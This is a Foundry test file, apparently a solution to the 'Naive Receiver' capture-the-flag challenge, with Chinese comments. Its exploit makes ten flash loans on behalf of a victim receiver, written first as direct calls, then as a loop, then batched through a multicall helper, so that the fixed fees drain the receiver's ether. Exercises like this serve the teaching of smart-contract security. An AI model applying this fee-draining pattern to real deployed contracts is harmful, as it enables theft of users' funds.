// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {FlashLoanReceiver} from "../../../src/Contracts/naive-receiver/FlashLoanReceiver.sol";
import {NaiveReceiverLenderPool} from "../../../src/Contracts/naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiver is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;
    uint256 internal constant ETHER_IN_RECEIVER = 10e18;

    Utilities internal utils;
    NaiveReceiverLenderPool internal naiveReceiverLenderPool;
    FlashLoanReceiver internal flashLoanReceiver;
    address payable internal user;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);
        user = users[0];
        attacker = users[1];

        vm.label(user, "User");
        vm.label(attacker, "Attacker");

        naiveReceiverLenderPool = new NaiveReceiverLenderPool();
        vm.label(address(naiveReceiverLenderPool), "Naive Receiver Lender Pool");
        vm.deal(address(naiveReceiverLenderPool), ETHER_IN_POOL);

        assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL);
        assertEq(naiveReceiverLenderPool.fixedFee(), 1e18);

        flashLoanReceiver = new FlashLoanReceiver(
            payable(naiveReceiverLenderPool)
        );
        vm.label(address(flashLoanReceiver), "Flash Loan Receiver");
        vm.deal(address(flashLoanReceiver), ETHER_IN_RECEIVER);

        assertEq(address(flashLoanReceiver).balance, ETHER_IN_RECEIVER);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    // Call结构体，包含目标合约target，是否允许调用失败allowFailure，和call data
    struct Call {
        address target;
        bool allowFailure;
        bytes callData;
    }

    // Result结构体，包含调用是否成功和return data
    struct Result {
        bool success;
        bytes returnData;
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker);

        ///////////////////////////////////////////////////
        ///  原始方式 - 簡單粗暴
        ///////////////////////////////////////////////////
        // naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 100 ether);
        // naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 100 ether);
        // naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 100 ether);
        // naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 100 ether);
        // naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 100 ether);
        // naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 100 ether);
        // naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 100 ether);
        // naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 100 ether);
        // naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 100 ether);
        // naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 100 ether);

        ///////////////////////////////////////////////////
        ///  用迴圈 call
        ///////////////////////////////////////////////////
        // for (uint256 i = 0; i < 10; i++) {
        //     naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 100 ether);
        // }

        ///////////////////////////////////////////////////
        ///  用 multicall
        ///////////////////////////////////////////////////
        uint256 runCount = 10;
        Call[] memory calls = new Call[](runCount);
        // function selector 不能有空白 = = ...  找好久的 bug = =
        bytes memory data =
            abi.encodeWithSignature("flashLoan(address,uint256)", address(flashLoanReceiver), 100 * 10 ** 18);

        for (uint256 i = 0; i < runCount; i++) {
            calls[i] = Call(address(naiveReceiverLenderPool), true, data);
        }
        multicall(calls);

        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // All ETH has been drained from the receiver
        assertEq(address(flashLoanReceiver).balance, 0);
        assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
    }

    /// @notice 将多个调用（支持不同合约/不同方法/不同参数）合并到一次调用
    /// @param calls Call结构体组成的数组
    /// @return returnData Result结构体组成的数组
    function multicall(Call[] memory calls) public returns (Result[] memory returnData) {
        uint256 length = calls.length;
        returnData = new Result[](length);
        Call memory calli;

        // 在循环中依次调用
        for (uint256 i = 0; i < length; i++) {
            Result memory result = returnData[i];
            calli = calls[i];
            // (address rc, uint256 am) = abi.decode(calli.callData, (address, uint256));
            // console.log("rc", rc);
            // console.log("am", am);
            // console.log("target", calli.target);
            (result.success, result.returnData) = calli.target.call(calli.callData);
            // 如果 calli.allowFailure 和 result.success 均为 false，则 revert
            if (!(calli.allowFailure || result.success)) {
                revert("Multicall: call failed");
            }
        }
    }
}
